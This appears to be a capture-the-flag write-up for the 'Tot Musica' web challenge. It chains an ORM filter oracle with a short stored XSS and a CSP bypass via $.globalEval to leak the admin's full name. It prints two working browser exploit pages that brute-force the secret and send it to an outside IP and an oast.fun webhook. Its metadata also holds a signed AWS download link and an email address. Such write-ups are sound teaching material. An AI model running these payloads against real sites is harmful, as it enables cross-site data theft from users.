---
id: 12d48583-e65d-8099-8f39-e89e85a1307d
title: Tot Musica (Web) Unitended Solution - Cyber Jawara International
created_time: 2024-10-28T07:37:00.000Z
last_edited_time: 2024-10-31T12:15:00.000Z
cover_image: ./imgs/Screenshot_2024-10-28_190024_vfcaUMWX.png
icon_emoji: 😱
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Tot Musica (Web) Unitended Solution - Cyber Jawara International
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/Screenshot_2024-10-28_190024_vfcaUMWX.png

---

# Description

Someone just recently making a new website, find the full name of the author.

Please solve it in locally first!

BOT: <http://152.42.183.87:8182/>

Submit the Flag With This Format: `CJ{[a-z0-9\s]}`

<http://152.42.183.87:20004/>

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/ba81b409-35b6-41f3-815a-f39f26011c1e/tot-musica.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4666PL5AYA4%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T133625Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIBUrimbx7LP6LCJlc1OLH3%2F5VHKzy9sxxJP1B94cna3sAiEA%2BjgmIYWqG0di3T0GC1lXiz7PXqr1HLkK%2ByHYjGFBGFsqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPQzjCkz6L97OEGYfCrcA90C6peV%2Fd8Gqt2nzeRqCq2V87DtLu3y0dB34U55%2FEA5Y9cwcBs6KZlPJrgNWeTWn7N7p%2B0KojYLtr1kyrUI%2FXTs3kjFTVrDbMX8Ql%2BtgVc1cZmwQt7%2Bc846Ig7I4g2vTldXwMeHXMV7OTh8gdGNs7yTUf1sd5GFx5ol352U%2Fbvw%2F9hNyrPvFitMhBdCbDe40zw39WAqZyU8aHwYdPa97MWuAFjAwCT0%2BSL8bfNdhCNznKptLnu7ye2UgnPeY6ywo%2FIqlnnyvvm51BWXaw5e5kaDes6cBsMhNiP1jodD0LB4Rx%2BIKMjJAXauF5NJRJCWKDfR9voMyae5k80gf5dgLHsycc%2Fm1ms4y8yHbuBvb%2FrnMbQ5ZpUqCaCd3FCcG78rVLNWYftRHFr0Pbkrbw0Tb0kNYoccEoK2Pnli0z1edlzdiTuJwaBv53i%2BBdTEHa0d9OVagajgpGAQxFRzkqE3s2nx3F7ulxkb9geI5GM1ex4LJxph8bC%2BX7umn3kLRhlOu5M0QMo23C5lg4GKZp7w%2B5hcVY%2BskXCU8Zu0ylvncB6s0dbH3MA04Qwj9uBFaxKsRHoGrMUfDh5I%2BbD68VIybOTfs5k480khnndKPk8bWlzLw3ozTsg%2B9zaRJ4HyMJHywcEGOqUBGpJlX%2FORaIbotURFmPRR2kCYFo6i%2FmLW8IkK69g7nL9xf1eqk%2BoG5EIo0WUMU3wNK0hsOI%2BsNJVXfgNyNtClbprWSHC6mB2elVW%2BKiPiBX7u%2BQRlEaXFx5rPUB7g03DRbaahDkLPrtFCQ0wiPbgMV5Ug0sujCGxwoa%2B3U%2FsLZGXq43fgukBi3htVWBpGYx1ldIqBeBk4dgfms5B95U6cdSC5V3ns\&X-Amz-Signature=bb7b2d2db897ac543be99a1b8ab82a062c89084b268594139dfabe58a3f3e010\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to solve

Here’s a breakdown of how to approach this challenge by chaining multiple vulnerabilities together to retrieve the flag stored in the `full_name` of the admin user.

The first vulnerability here is an ORM oracle. You can exploit this to leak specific columns, particularly the `full_name` column from the `users` table.

![](./imgs/image_ZRDM8b1m.png)

Vulnerable Code:

```php
public static function applyFilters(Builder $query, array $params, int $user_id): Builder
    {
        foreach ($params as $key => $value) {
            if (strpos($key, '.') !== false) {
                $relations = explode('.', $key);
                if (count($relations) === 2) {
                    list($relation, $field) = $relations;
                    $query->whereHas($relation, function ($q) use ($field, $value, $user_id) {
                        $q->where($field, 'LIKE', '%' . $value . '%');
                    });
                }
            } else {
                $query->where($key, 'LIKE', '%' . $value . '%');
            }
        }

        $query->where('user_id', '=', $user_id);


        return $query;
    }
```

The second vulnerability is an XSS issue, caused by an exploitable username field in `search.html`.

Vulnerable Code:

```javascript
...snip...
        $(function () {
            var owner = "{{username}}";
            
            var playerTrack = $("#player-track"),
...snip...
```

![](./imgs/image_IURhrPrf.png)

A limitation here is that the `username` field has a max character limit of 64, so any XSS payloads need to be concise. Using jQuery’s `$.globalEval` can help shorten the payload further and bypass Content Security Policy (CSP) restrictions `unsafe-eval`.

![](./imgs/image_qHCyxPv9.png)

CSP restrictions might prevent certain scripts from running, but `$.globalEval` can be used to bypass this as it using different approach to execute a string as a script. maybe the implementation will look like this:

![](./imgs/image_OtRJS8ZE.png)

You would use `$.globalEval` to craft an XSS payload, leveraging `nonce` attributes and `name` variables. The `name` variable is set using a cross-site opener by supplying a window open command with a target parameter.

![](./imgs/image_uxesQxcI.png)

![](./imgs/image_lTZHdurC.png)

![](./imgs/image_DseZRXwv.png)

For the nonce, since it uses a custom template, it is rendered twice, allowing us to supply the `{{nonce}}` value again.

![](./imgs/image_k6bjGpcN.png)

Here is the redering logic:

./php/src/Frameworks/Renderer.php

    ```php
    <?php

    declare(strict_types=1);

    namespace App\Frameworks;

    use Error;
    use InvalidArgumentException;
    use Psr\Http\Message\ResponseInterface;
    use RuntimeException;
    use Throwable;

    class Renderer
    {
        protected string $templatePath;

        /**
         * @var array<string, mixed>
         */
        protected array $attributes;

        protected string $layout;

        /**
         * @param string $templatePath
         * @param array<string, mixed> $attributes
         * @param string $layout
         */
        public function __construct(string $templatePath = '', array $attributes = [], string $layout = '')
        {
            $this->templatePath = rtrim($templatePath, '/\\') . '/';
            $this->attributes = $attributes;
            $this->setLayout($layout);
        }

        /**
         * @param ResponseInterface $response
         * @param string $template
         * @param array<string, mixed> $data
         * @param bool $sanitize
         *
         * @throws Throwable
         *
         * @return ResponseInterface
         */
        public function render(ResponseInterface $response, string $template, array $data = [], bool $sanitize = true): ResponseInterface
        {
            $output = $this->fetch($template, $data, true, $sanitize);
            $response->getBody()->write($output);
            return $response;
        }

        /**
         * @return string
         */
        public function getLayout(): string
        {
            return $this->layout;
        }

        /**
         * @param string $layout
         *
         * @throws \Exception
         *
         * @return void
         */
        public function setLayout(string $layout): void
        {
            if ($layout && !$this->templateExists($layout)) {
                throw new \Exception('Layout template "' . $layout . '" does not exist');
            }

            $this->layout = $layout;
        }

        /**
         * @return array<string, mixed>
         */
        public function getAttributes(): array
        {
            return $this->attributes;
        }

        /**
         * @param array<string, mixed> $attributes
         *
         * @return void
         */
        public function setAttributes(array $attributes): void
        {
            $this->attributes = $attributes;
        }

        /**
         * @param string $key
         * @param mixed $value
         *
         * @return void
         */
        public function addAttribute(string $key, $value): void
        {
            $this->attributes[$key] = $value;
        }

        /**
         * @param string $key
         *
         * @return bool|mixed
         */
        public function getAttribute(string $key)
        {
            if (!isset($this->attributes[$key])) {
                return false;
            }

            return $this->attributes[$key];
        }

        /**
         * @return string
         */
        public function getTemplatePath(): string
        {
            return $this->templatePath;
        }

        /**
         * @param string $templatePath
         */
        public function setTemplatePath(string $templatePath): void
        {
            $this->templatePath = rtrim($templatePath, '/\\') . '/';
        }

        /**
         * @param string $template
         * @param array<string, mixed> $data
         * @param bool $useLayout
         * @param bool $sanitize
         *
         * @return string
         */
        public function fetch(string $template, array $data = [], bool $useLayout = false, bool $sanitize = true): string
        {
            $output = $this->processTemplate($template, $data, $sanitize);
            if ($this->layout && $useLayout) {
                $data['content'] = $output;
                $output = $this->processTemplate($this->layout, $data, $sanitize);
            }

            return $output;
        }

        protected function processTemplate(string $templateContent, array $data, $sanitize = true): string
        {
            try {
                $templateContent = file_get_contents($this->templatePath . $templateContent);
                foreach ($data as $k => $v) {
                    if($sanitize){
                        $v = htmlentities($v, ENT_NOQUOTES);
                    }
                    $templateContent = str_replace("{{" . $k . "}}", $v, $templateContent);
                }

                $tokens = $this->tokenizeTemplate($templateContent);

                foreach ($tokens as $token) {
                    $functionName = $token['function'];
                    $arguments = $token['arguments'];
                    $fullMatch = $token['full_match'];

                    $result = $this->handleTemplateFunction($functionName, $arguments);

                    $templateContent = str_replace($fullMatch, $result, $templateContent);
                }
                return $templateContent;
            } catch (\Exception $th) {
            }
            
        }

        /**
         * @param string $template
         *
         * @return bool
         */
        public function templateExists(string $template): bool
        {
            $path = $this->templatePath . $template;
            return is_file($path) && is_readable($path);
        }

        /**
         * @param string $template
         *
         * @return array
         */
        protected function tokenizeTemplate(string $template): array
        {
            $pattern = '/\{\{\s*(\w+)\s*\((('
                     . '\'(?:\\\\\'|[^\'])*\'|'
                     . '"(?:\\\\"|[^"])*"|'
                     . '[^\'")])*?)\)\s*\}\}/s';

            preg_match_all($pattern, $template, $matches, PREG_SET_ORDER);
            $tokens = [];
            
            foreach ($matches as $match) {
                $functionName = $match[1];
                $arguments = $match[2];

                // Parse arguments
                $args = $this->parseArguments($arguments);

                $tokens[] = [
                    'function' => $functionName,
                    'arguments' => $args,
                    'full_match' => $match[0],
                ];
            }

            return $tokens;
        }

        /**
         * @param string $template
         *
         * @return array
         */
        protected function parseArguments(string $arguments): array
        {
            $args = [];
            $length = strlen($arguments);
            $i = 0;

            while ($i < $length) {
                while ($i < $length && ctype_space($arguments[$i])) {
                    $i++;
                }

                if ($i >= $length) {
                    break;
                }

                if ($arguments[$i] === "'" || $arguments[$i] === '"') {
                    $quote = $arguments[$i];
                    $i++;
                    $start = $i;
                    $escaped = false;
                    $arg = '';

                    while ($i < $length) {
                        $char = $arguments[$i];

                        if ($char === '\\' && !$escaped) {
                            $escaped = true;
                            $i++;
                            continue;
                        }

                        if ($char === $quote && !$escaped) {
                            break;
                        }

                        $arg .= $char;
                        $escaped = false;
                        $i++;
                    }

                    $args[] = $arg;
                    $i++;
                } else {
                    $start = $i;
                    
                    
                    while ($i < $length && $arguments[$i] !== ',' && $arguments[$i] !== ')') {
                        $i++;
                    }
                    
                    $arg = trim(substr($arguments, $start, $i - $start));
                    $args[] = $arg;
                }

                while ($i < $length && (ctype_space($arguments[$i]) || $arguments[$i] === ',')) {
                    $i++;
                }
            }

            return $args;
        }
        
        /**
         * @param string $functionName
         * @param array $arguments
         *
         * @return string
         */
        protected function handleTemplateFunction(string $functionName, array $arguments): string
        {
            switch ($functionName) {
                case 'include':
                    $includedTemplate = $arguments[0] ?? '';
                    return $includedTemplate;
                case 'lower':
                    $text = $arguments[0] ?? '';
                    return strtoupper($text);
                case 'upper':
                    $text = $arguments[0] ?? '';
                    return strtoupper($text);
                // Add more cases for other functions
                default:
                    // Optionally handle unknown functions
                    return '';
            }
        }
    }
    ```

Here is the final payload:

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        const target = "http://nginx";
        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        (async () => {
            const form = document.createElement("form");
            form.method = "POST";
            form.action= target+"/auth/forgot-password";
            form.target = "_blank"
            const input = document.createElement("input");
            input.name = "username";
            input.value = '"+$.globalEval(name, {nonce:"{{nonce}}"})+"';
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
            await sleep(1000);
            const w2 = window.open(target+"/songs/search?filter[title]=", `(async function(){
    let base = "/songs/search?filter[user.full_name]=";
    let chrs = "abcdefghijklmnopqrstuvwxyz0123456789 ";
    let exfil = "http://103.185.44.93:8989?data=";
    let found = "";
    
    let lenn = 0;
    for(let x = 1; x < 100; x++) {
        let stop = false;
        await fetch(base + encodeURI('_'.repeat(x)), {credentials:'include'})
        .then(r=>r.text())
        .then(text=>{
            if (!text.includes("V9_ZpqfqHFI")) {
                lenn = x - 1;
                stop = true;
            }
        })
        
        if (stop) {break;}
    }
    
    for(let x = 0; x < lenn; x++) {
        for(let i = 0; i < chrs.length; i++) {
            await fetch(base + encodeURI(found + chrs[i] + '_'.repeat(lenn-(found+chrs[i]).length)), {credentials:'include'})
            .then(r=>r.text())
            .then(text=>{
                if (!text.includes("Songs Not Found")) {
                    found += chrs[i];
                    fetch(exfil + encodeURI(found));
                }
            })
        }
    }
})()`);
        })();
    </script>
</body>
</html>
```

> 💡 Note:

    First, you need to register a user with the username `"+$.globalEval(name, {nonce:"{{nonce}}"})+"`. Then, host the HTML file on your server, replacing `http://103.185.44.93:8989` with your own server's address.

# Intended Solution solver

Using time based XSLEAK:

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
     <form id="formize" action="" target="bz" method="get">
        <input type="submit" value="">
     </form>
    <script>
        let webhook = "http://iyadmuyyzzqjoeobxwjt6pgn9iuo1w6a7.oast.fun/?log"
        let remote = "http://nginx/"
        const log = (msg) => {
            console.log(msg);
            navigator.sendBeacon(webhook, msg);
        }
        const sleep = ms => new Promise(r => setTimeout(r, ms));
        
        function exploit(payload){
            return new Promise((resolve, reject) => {
                // ORM Injection
                var win = window.open(`${remote}songs/search?filter[user.full_name]=${encodeURIComponent(payload)}`);
                var start = performance.now();
                function measure(){
                    try{
                        // recursive until the origin is different
                        win.origin;
                        setTimeout(measure, 0);
                    }catch(e){
                        var time = performance.now() - start;
                        resolve(time)

                        win.close()
                    }
                }
                measure()
            })
        }

        // csrf and session puzzling
        // make sure users, with username {{upper('upper('a')')}} is available
        formize.action = `${remote}auth/forgot-password{{upper('upper('a')')}}`
        formize.submit()
        
        Array.prototype.sum = function() {
            return this.reduce(function(a, b) {return a+b});
        };
        Array.prototype.max = function() {
            return Math.max.apply(null, this);
        };

        Array.prototype.min = function() {
            return Math.min.apply(null, this);
        };

        function roundFloor(number) {
            let magnitude = Math.pow(10, Math.floor(Math.log10(number)));
            return Math.floor(number / magnitude) * magnitude;
        }

        (async () => {
            let true_res = []
            let false_res = []

            // warming up
            var payload = "_"
            await exploit(payload)
            await exploit(payload)
            
            var payload = "bz"
            await exploit(payload)
            await exploit(payload)

            // finding the ideal threshold
            for (let index = 0; index < 10; index++) {
                var payload = "_"
                true_res.push(await exploit(payload))
            }
            
            log(`result_true: ${true_res}`)
            log(`avg_result_true: ${true_res.sum() / true_res.length}`)
            log(`min_result_true: ${true_res.min()}`)

            let threshold = roundFloor(true_res.min())
            log("thresh: " + threshold)

            // determine the flag length
            let length = 1
            while(true){
                payload = "_".repeat(length)
                time = await exploit(payload)
                log("time: " + time)

                // find until the username isn't rendered; the response should be faster
                if(time <= threshold){
                    flag_length = length-1
                    log(`flag_length: ${flag_length}`)
                    break;
                }
                length += 1
            }

            let charset = "abcdefghijklmnopqrstuvwxyz0123456789 "
            let idx = 0;
            let flag_placeholder = "_".repeat(flag_length)
            let flag = ""

            while(true){
                for (const char of charset) {
                    tmp = flag + char + "_".repeat(flag_length - flag.length - 1);
                    // log(`attempt: ${idx}:${tmp}`)
                    time = await exploit(tmp)
                    if(time >= threshold){
                        log(`flag_temp: ${tmp}`)
                        flag += char
                        idx++
                        break
                    }
                }

                if (flag.length == flag_length) {
                    log(`FLAG: ${flag}`)
                    break
                }
            }
        })()
        
    </script>
</body>
</html>
```
